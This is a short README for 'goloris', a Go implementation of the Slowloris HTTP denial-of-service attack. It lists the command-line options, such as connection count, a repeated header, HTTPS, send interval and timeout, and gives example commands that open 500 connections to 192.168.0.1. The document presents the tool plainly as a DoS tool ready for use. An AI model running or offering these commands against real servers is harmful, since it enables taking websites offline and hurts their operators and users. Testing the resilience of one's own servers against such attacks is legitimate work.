goloris
=======

[Slowloris HTTP DoS](http://ckers.org/slowloris/) implementation in golang.

```
usage: goloris [OPTIONS]... TARGET
  TARGET host:port. port 80 is assumed for HTTP connections. 443 is assumed for HTTPS connections

OPTIONS
  -connections=10: Number of active concurrent connections
  -dosHeader="Cookie: a=b": Header to send repeatedly
  -https=false: Use HTTPS
  -interval=1: Number of seconds to wait between sending headers
  -method="GET": HTTP method to use
  -resource="/": Resource to request from the server
  -timeout=60: HTTP connection timeout in seconds
  -timermode=false: Measure the timeout of the server. connections flag is omitted
  -useragent="Goloris HTTP DoS": User-Agent header of the request

EXAMPLES
  ./goloris -connections=500 192.168.0.1
  ./goloris -https -connections=500 192.168.0.1
  ./goloris -useragent="some user-agent string" -https -connections=500 192.168.0.1
```
